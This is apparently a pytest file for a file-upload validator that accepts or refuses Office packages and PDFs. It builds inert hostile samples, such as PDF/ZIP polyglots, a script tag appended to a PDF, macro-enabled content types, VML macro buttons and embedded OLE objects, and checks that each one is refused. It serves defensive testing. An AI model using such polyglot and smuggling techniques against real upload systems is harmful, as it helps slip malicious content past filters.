    refused(office({"word/_rels/document.xml.rels": rels(b'<Relationship Id="rId1" Type="' + REL_NS + rtype + b'" Target="x.xml"/>')}),
            "office_refused")


def test_a_realistic_package_with_styles_pictures_and_a_worksheet_pivot_cache_passes():
    ct = with_types(CT_DOCX, override=("word/styles.xml", "application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"))
    ct = with_types(ct, override=("docProps/core.xml", "application/vnd.openxmlformats-package.core-properties+xml"))
    ok = office({"[Content_Types].xml": ct}, extra={"word/styles.xml": b'<?xml version="1.0"?><w:styles ' + W_NS + b"/>",
                                                     "docProps/core.xml": b"<cp:coreProperties xmlns:cp=\"cp\"/>",
                                                     "word/media/image1.png": b"\x89PNG\r\n\x1a\n"})
    assert rf.check_office(ok).kind == "docx"
    pivot = "xl/pivotCache/pivotCacheDefinition1.xml"
    ct = with_types(CT_XLSX, override=(pivot, "application/vnd.openxmlformats-officedocument.spreadsheetml.pivotCacheDefinition+xml"))
    body = (b'<pivotCacheDefinition xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><cacheSource type="worksheet">'
            b'<worksheetSource ref="A1:B2" sheet="Sheet1"/></cacheSource></pivotCacheDefinition>')
    assert rf.check_office(office({"[Content_Types].xml": ct}, kind="xlsx", extra={pivot: body})).kind == "xlsx"


def test_the_main_part_type_must_be_exactly_the_macro_free_one():
    # the macro-free type appears in the document, but the main part's OWN override is the macro-enabled one
    ct = CT_DOCX.replace(CT_MAIN_DOCX.encode(), b"application/vnd.ms-word.document.macroEnabled.main+xml")
    ct = with_types(ct, override=("word/other.xml", CT_MAIN_DOCX))
    refused(office({"[Content_Types].xml": ct}), "office_refused")
    # a type spelled with a character reference is decoded, and still compared exactly
    ct = CT_DOCX.replace(b"document.main+xml", b"document.m&#97;in+xml")
    assert rf.check_office(office({"[Content_Types].xml": ct})).kind == "docx"


# ---------------------------------------------------------------- review 2.6.4 F3: PDF / ZIP polyglots by structure

def small_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("a.txt", "x")
    return buf.getvalue()


def test_a_pdf_with_anything_after_its_last_eof_is_refused():
    tiny = small_zip()
    assert len(tiny) < 1024  # small enough that "%%EOF within the last KiB" still held - the incidental refusal is gone
    refused(pdf() + tiny, "pdf_invalid")
    refused(pdf() + b"<script>alert(1)</script>", "pdf_invalid")
    # the payload with a trailer re-appended: the end looks right, the ZIP directory inside does not
    refused(pdf() + tiny + b"\n%%EOF\n", "pdf_refused")
    # a ZIP placed INSIDE the PDF (a stream object before the trailer) - a ZIP reader still finds it
    refused(pdf(b"<< /Length %d >>\nstream\n" % len(tiny) + tiny + b"\nendstream"), "pdf_refused")
    # ordinary endings pass: a newline, CRLF, trailing NULs / spaces
    for tail in (b"", b"\n", b"\r\n", b"\r\n\x00\x00  \n"):
        assert rf.check_pdf(pdf(tail=tail)).bytes > 0


def _office_with_first_entry(name: str, extra: bytes = b"", body: bytes = b"<x/>") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        info = zipfile.ZipInfo(name)
        info.extra = extra
        z.writestr(info, body)
        for n, b in (("[Content_Types].xml", CT_DOCX), ("_rels/.rels", RELS), ("word/document.xml", DOC)):
            if n != name:
                z.writestr(n, b)
    return buf.getvalue()


def test_an_office_package_with_another_format_in_its_head_is_refused():
    # %PDF- in the first KiB: Acrobat would open the package as a PDF
    refused(_office_with_first_entry("[Content_Types].xml", body=CT_DOCX.replace(b"<Types", b"<!-- %PDF-1.7 --><Types")), "office_refused")
    refused(_office_with_first_entry("[Content_Types].xml", extra=struct.pack("<HH", 0xCAFE, 9) + b"%PDF-1.7\n"), "office_refused")
    # a picture's / an executable's magic in the first entry's extra field
    for magic in (b"\xff\xd8\xff\xe0", b"\x89PNG", b"GIF89a", b"<html><script>"):
        refused(_office_with_first_entry("[Content_Types].xml", extra=struct.pack("<HH", 0xCAFE, len(magic)) + magic), "office_refused")
    # the same package without the foreign head passes
    assert rf.check_office(_office_with_first_entry("[Content_Types].xml", body=CT_DOCX)).kind == "docx"


# ---------------------------------------------------------------- the installation switch and the decode slot

def test_office_is_refused_before_any_scan_when_the_installation_switch_is_off(tmp_path, monkeypatch):
    calls = []
    monkeypatch.setattr(rf, "check_office", lambda data: calls.append(1))
    with pytest.raises(IntakeError) as e:
        rf.store(tmp_path, "rfq1", office(), allow_office=False)
    assert (e.value.code, e.value.status) == ("office_disabled", 422) and calls == [] and not any(tmp_path.rglob("*.docx"))
    # PDF and pictures never depend on the switch
    assert rf.store(tmp_path, "rfq1", pdf(), allow_office=False).kind == "pdf"
    assert rf.store(tmp_path, "rfq1", jpeg(), allow_office=False).kind == "image"
    assert rf.limits(False)["types"] == ["jpg", "png", "webp", "pdf"] and rf.limits(True)["types"][-2:] == ["docx", "xlsx"]


def test_the_office_scan_waits_for_the_routes_decode_slot(tmp_path):
    assert rf._DECODE.acquire(timeout=1)
    try:
        with pytest.raises(IntakeError) as e:
            rf.store(tmp_path, "rfq1", office(), wait_s=0.05, allow_office=True)
        assert (e.value.code, e.value.status) == ("busy", 429)
    finally:
        rf._DECODE.release()
    assert rf.store(tmp_path, "rfq1", office(), allow_office=True).kind == "docx"


def test_legacy_vml_comments_pass_and_vml_macro_buttons_or_ole_are_refused():
    vml = (b'<xml xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" '
           b'xmlns:x="urn:schemas-microsoft-com:office:excel"><v:shape id="_x0000_s1025"><v:textbox><div>line one<br>line two</div>'
           b'</v:textbox><x:ClientData ObjectType="Note"><x:Row>0</x:Row></x:ClientData></v:shape></xml>')
    ct = with_types(CT_XLSX, default=("vml", "application/vnd.openxmlformats-officedocument.vmlDrawing"))
    assert rf.check_office(office({"[Content_Types].xml": ct}, kind="xlsx", extra={"xl/drawings/vmlDrawing1.vml": vml})).kind == "xlsx"
    button = vml.replace(b'ObjectType="Note"><x:Row>0</x:Row>', b'ObjectType="Button"><x:FmlaMacro>[0]!Evil</x:FmlaMacro>')
    refused(office({"[Content_Types].xml": ct}, kind="xlsx", extra={"xl/drawings/vmlDrawing1.vml": button}), "office_refused")
    ole = vml.replace(b"</v:shape>", b'</v:shape><o:OLEObject Type="Embed" ProgID="Package" ShapeID="_x0000_s1025"/>')
    refused(office({"[Content_Types].xml": ct}, kind="xlsx", extra={"xl/drawings/vmlDrawing1.vml": ole}), "office_refused")
